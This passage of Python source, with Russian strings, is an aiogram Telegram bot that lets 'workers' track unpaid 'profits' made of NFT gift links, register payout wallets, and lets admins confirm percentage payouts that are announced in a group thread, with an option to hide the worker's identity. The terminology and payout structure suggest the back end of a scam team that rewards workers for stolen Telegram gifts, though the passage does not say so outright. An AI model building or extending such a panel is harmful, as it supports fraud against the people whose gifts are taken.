    profits_list = database.read_profits()

    keyboard = []

    if len(profits_list):
        for profit in profits_list:
            if profit[1] == callback.from_user.id:
                keyboard.append([
                    InlineKeyboardButton(
                        text=f"#{profit[0]} - {'{:.2f}'.format(float(profit[4]))} 💎",
                        callback_data=f"profit_{profit[0]}"
                    )
                ])

    if not len(profits_list):
        keyboard.append([
            InlineKeyboardButton(
                text="Нет профитов",
                callback_data="no_profits"
            )
        ])

    markup = InlineKeyboardMarkup(inline_keyboard=keyboard)

    await callback.message.answer(
        "<tg-emoji emoji-id='5039978413427787762'>🔄</tg-emoji> <b>Выберите неоплаченный профит для управления:</b>",
        parse_mode="HTML",
        reply_markup=markup,
    )

@dp.callback_query(F.data.startswith("profit_"))
async def profit_callback(callback: CallbackQuery):
    profit_id = callback.data.split("_")[-1]
    profit = database.read_profit(profit_id=profit_id)

    profits_list = profit[3].split(" ")

    keyboard = []

    if len(profits_list):
        for profit in profits_list:
            profit_slug = profit.split("/")[-1]
            keyboard.append([
                InlineKeyboardButton(
                    text=f"{profit_slug}",
                    callback_data=f"manage_gift_{profit_slug}"
                )
            ])

    if not len(profits_list):
        keyboard.append([
            InlineKeyboardButton(
                text="Нет гифтов",
                callback_data="no_profits"
            )
        ])

    markup = InlineKeyboardMarkup(inline_keyboard=keyboard)

    await callback.message.answer(
        f"<tg-emoji emoji-id='5039978413427787762'>🔄</tg-emoji> <b>Профит #{profit_id}</b>\n\n<b>Выберите подарок для управления:</b>",
        parse_mode="HTML",
        reply_markup=markup,
    )

@dp.callback_query(F.data == "change_wallet")
async def change_wallet_callback(callback: CallbackQuery):
    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=("🔄 Изменить"),
                    callback_data="change_wallet_confirm",
                )
            ],
            [
                InlineKeyboardButton(
                    text=("❌ Отмена"), callback_data="delete"
                )
            ],
        ]
    )
    await callback.message.answer(
        ("<b>Сменить кошелёк для выплат?</b>") + worker_cute_suffix(),
        parse_mode="HTML",
        reply_markup=markup,
    )


@dp.callback_query(F.data == "change_wallet_confirm")
async def change_wallet_confirm_callback(callback: CallbackQuery, state: FSMContext):
    await state.set_state(ProfitPayFSM.waiting_for_wallet)
    await callback.message.answer(
        ("<b>Пришли новый кошелёк одним сообщением</b>")
        + worker_cute_suffix(),
        parse_mode="HTML",
    )
    await callback.message.delete()


@dp.message(ProfitPayFSM.waiting_for_wallet)
async def process_wallet(message: Message, state: FSMContext):
    wallet = str(message.text).replace(" ", "")
    if len(wallet) > 64:
        return await message.answer(
            ("<b>До 64 символов, попробуй ещё раз</b>") + worker_cute_suffix(),
            parse_mode="HTML",
        )

    has_wallet = database.get_worker_wallet(message.from_user.id)
    if not has_wallet:
        database.write_worker(
            message.from_user.id, wallet, message.from_user.full_name, worker=True
        )
    else:
        database.set_worker_wallet(message.from_user.id, wallet)
    await message.answer(
        ("<b>Кошелёк сохранён</b>") + worker_cute_suffix(),
        parse_mode="HTML",
    )
    await state.clear()


@dp.callback_query(lambda c: c.data.startswith("delete_profit:"))
async def delete_profit_handler(callback_query: types.CallbackQuery):
    if callback_query.from_user.id not in config.ADMIN_ID:
        return await callback_query.answer(
            mutate_text("⛔️ Только для админов.") + " ^^"
        )

    profit_id = callback_query.data.split(":")[1]

    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=("✅ Удалить точно"),
                    callback_data=f"confirm_delete_profit:{profit_id}",
                )
            ],
            [
                InlineKeyboardButton(
                    text=("❎ Отмена"), callback_data="delete"
                )
            ],
        ]
    )

    await callback_query.message.answer(
        (f"<b>Снести запись <code>#{profit_id}</code>?</b>"),
        parse_mode="HTML",
        reply_markup=markup,
    )


@dp.callback_query(lambda c: c.data.startswith("confirm_delete_profit:"))
async def confirm_delete_profit_handler(callback_query: types.CallbackQuery):
    if callback_query.from_user.id not in config.ADMIN_ID:
        return await callback_query.answer(
            mutate_text("⛔️ Только для админов.") + " ^^"
        )

    profit_id = callback_query.data.split(":")[1]
    worker_id = database.read_profit(profit_id)[1]

    database.clear_profits(profit_id)

    try:
        await bot.send_message(
            worker_id,
            f"<b>❌ Запись <code>#{profit_id}</code> снята админом</b>",
            parse_mode="HTML",
        )
    except:
        await callback_query.message.answer(
            f"<b>Не дошло до воркера <code>{worker_id}</code> · <code>#{profit_id}</code></b>",
            parse_mode="HTML",
        )

    await callback_query.message.answer(
        (f"<b>Запись <code>#{profit_id}</code> удалена</b>"),
        parse_mode="HTML",
    )


@dp.callback_query(lambda c: c.data.startswith("confirm_profit:"))
async def confirm_profit_handler(callback_query: types.CallbackQuery):
    if callback_query.from_user.id not in config.ADMIN_ID:
        return await callback_query.answer(
            mutate_text("⛔️ Только для админов.") + " ^^"
        )

    profit_id = callback_query.data.split(":")[1]

    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=("✅ Закрыть выплату"),
                    callback_data=f"confirm_payout_profit:{profit_id}",
                )
            ],
            [
                InlineKeyboardButton(
                    text=("❎ Отмена"), callback_data="delete"
                )
            ],
        ]
    )

    await callback_query.message.answer(
        (f"<b>Подтвердить выплату по <code>#{profit_id}</code>?</b>"),
        parse_mode="HTML",
        reply_markup=markup,
    )


@dp.callback_query(lambda c: c.data.startswith("confirm_payout_profit:"))
async def confirm_payout_profit_handler(callback_query: types.CallbackQuery):
    if callback_query.from_user.id not in config.ADMIN_ID:
        return await callback_query.answer(
            mutate_text("⛔️ Только для админов.") + " ^^"
        )

    profit_id = callback_query.data.split(":")[1]
    worker_id = database.read_profit(profit_id)[1]
    profit = database.read_profit(profit_id)[3]
    amount = database.read_profit(profit_id)[4]

    wallet = database.get_worker_wallet(worker_id)

    database.clear_profits(profit_id)

    json_settings = open(f"{absolute_path}/storage/settings.json", "r").read()
    json_settings = json.loads(json_settings)

    worker_private_mode = json_settings["worker_privacy"]

    with open(f"{absolute_path}/storage/procents.json", "r", encoding="utf-8") as f:
        data = f.read()

    if not data:
        return

    procentage_data = json.loads(data)
    procentage = int(procentage_data["worker"])

    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="🥷 КРАСАВЧИК", url=f"tg://user?id={worker_id}"
                )
            ],
        ]
    )

    try:
        payouts = float(database.get_user_payouts(worker_id) or 0)
        database.set_user_payouts(
            worker_id, payouts + (float(amount) * procentage) / 100
        )
    except:
        pass

    try:
        await bot.send_video(
            video=FSInputFile(BASE_DIR / "static" / "payout.mp4"),
            chat_id=worker_id,
            caption=f"<b><tg-emoji emoji-id='5042073064683078990'>✅</tg-emoji> ВЫПЛАТА <code>#{profit_id}</code></b>\n\n<b>НФТ:</b>\n{profit}\n\n<b><tg-emoji emoji-id='5255933397750014894'>💎</tg-emoji> Сумма:</b> <code>{'{:.2f}'.format((float(amount) * procentage) / 100)}</code> <tg-emoji emoji-id='5193179982775476271'>💎</tg-emoji>\n\n<b>Кошелёк:</b>\n<code>{wallet}</code>"
            + worker_cute_suffix(),
            parse_mode="HTML",
        )
    except:
        await callback_query.message.answer(
            f"<b>Не дошло до воркера <code>{worker_id}</code> · <code>#{profit_id}</code></b>"
            + worker_cute_suffix(),
            parse_mode="HTML",
        )
    try:
        await bot.send_video(
            video=FSInputFile(BASE_DIR / "static" / "payout.mp4"),
            chat_id=config.WORK_GROUP_ID,
            message_thread_id=config.PAYOUTS_THREAD_ID,
            caption=(
                f"<b><tg-emoji emoji-id='5042073064683078990'>✅</tg-emoji> ВЫПЛАТА <code>#{profit_id}</code></b>\n\n"
                f"<blockquote>{profit}</blockquote>\n\n"
                f"<b><tg-emoji emoji-id='5255933397750014894'>💎</tg-emoji> Сумма:</b> <code>{'{:.2f}'.format((float(amount) * procentage) / 100)}</code> <tg-emoji emoji-id='5193179982775476271'>💎</tg-emoji>"
            ),
            parse_mode="HTML",
            reply_markup=markup if not worker_private_mode else None,
        )
    except Exception as e:
        if (
            "BUTTON_USER_PRIVACY_RESTRICTED" in str(e).upper()
            or "BUTTON_USER_INVALID" in str(e).upper()
        ):
            await bot.send_video(
                video=FSInputFile(BASE_DIR / "static" / "payout.mp4"),
                chat_id=config.WORK_GROUP_ID,
                message_thread_id=config.PAYOUTS_THREAD_ID,
                caption=(
                    f"<b><tg-emoji emoji-id='5042073064683078990'>✅</tg-emoji> ВЫПЛАТА <code>#{profit_id}</code></b>\n\n"
                    f"<blockquote>{profit}</blockquote>\n\n"
                    f"<b><tg-emoji emoji-id='5255933397750014894'>💎</tg-emoji> Сумма:</b> <code>{'{:.2f}'.format((float(amount) * procentage) / 100)}</code> <tg-emoji emoji-id='5193179982775476271'>💎</tg-emoji>"
                ),
                parse_mode="HTML",
            )

    await callback_query.message.answer(
        mutate_text(f"<b><code>#{profit_id}</code> закрыт и убран из очереди</b>")
        + worker_cute_suffix(),
        parse_mode="HTML",
    )
